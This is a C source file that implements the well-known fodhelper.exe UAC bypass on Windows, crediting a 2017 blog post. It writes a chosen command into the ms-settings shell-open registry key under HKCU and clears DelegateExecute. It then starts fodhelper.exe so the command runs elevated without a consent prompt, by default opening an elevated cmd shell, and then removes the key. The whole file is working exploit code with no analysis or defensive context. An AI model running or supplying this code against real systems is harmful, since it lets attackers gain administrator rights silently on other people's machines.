// https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/

#include <Windows.h>
#include <stdio.h>

#define RegSetStringValueA(a, b, strLiteralValue)	\
	RegSetValueExA( a, b, 0, REG_SZ, (BYTE*)(strLiteralValue), sizeof(strLiteralValue) )

BOOL call_Wow64DisableWow64FsRedirection(PVOID *OldValue) {
	typedef BOOL (WINAPI *pfWow64DisableWow64FsRedirection_t)(PVOID *OldValue);
	pfWow64DisableWow64FsRedirection_t pfWow64DisableWow64FsRedirection;
	HANDLE hModule = GetModuleHandleA("kernel32.dll");
	if (hModule == NULL)
		hModule = LoadLibraryA("kernel32.dll");
	if (hModule == NULL)
		return FALSE;
	pfWow64DisableWow64FsRedirection = (pfWow64DisableWow64FsRedirection_t)GetProcAddress(hModule, "Wow64DisableWow64FsRedirection");
	if (pfWow64DisableWow64FsRedirection == NULL)
		return FALSE;
	return pfWow64DisableWow64FsRedirection(OldValue);
}

int main(int argc, char *argv[]) {
	LONG nRet;
	HKEY hKey;
	
	if (argc < 2) {
		char buf[128];
		sprintf(
			buf,
			"%s %s",
			argv[0],
			"\"cmd /c echo @echo Hello world from elevated shell! > %temp%/elevated.bat && cmd /c echo @cmd >> %temp%/elevated.bat && %temp%/elevated.bat\""
		);
		return system(buf);
	}
	
	call_Wow64DisableWow64FsRedirection(&(void*) { 0 });
	
	nRet = RegCreateKeyExA(
		HKEY_CURRENT_USER,
		"Software\\Classes\\ms-settings\\Shell\\Open\\Command",
		0,
		NULL,
		REG_OPTION_VOLATILE,
		KEY_ALL_ACCESS,
		NULL,
		&hKey,
		NULL
	);
	if (nRet != ERROR_SUCCESS) {
		printf("Failed to create registry key!\n");
		return EXIT_FAILURE;
	}
	
	nRet = RegSetStringValueA(hKey, "DelegateExecute", "");
	if (nRet != ERROR_SUCCESS) {
		printf("Failed to set key value DelegateExecute!\n");
		RegCloseKey(hKey);
		RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\Open\\Command");
		return EXIT_FAILURE;
	}
	
	nRet = RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)argv[1], strlen(argv[1]) + 1);
	if (nRet != ERROR_SUCCESS) {
		printf("Failed to set key value (default)!\n");
		RegCloseKey(hKey);
		RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\Open\\Command");
		return EXIT_FAILURE;
	}
	
	//ShellExecuteA(NULL, "open", "C:\\Windows\\System32\\fodhelper.exe", NULL, NULL, SW_SHOW);
	system("start /w C:\\Windows\\System32\\fodhelper.exe");
	
	//Sleep(3000);
	
	RegCloseKey(hKey);
	RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\Open\\Command");
}
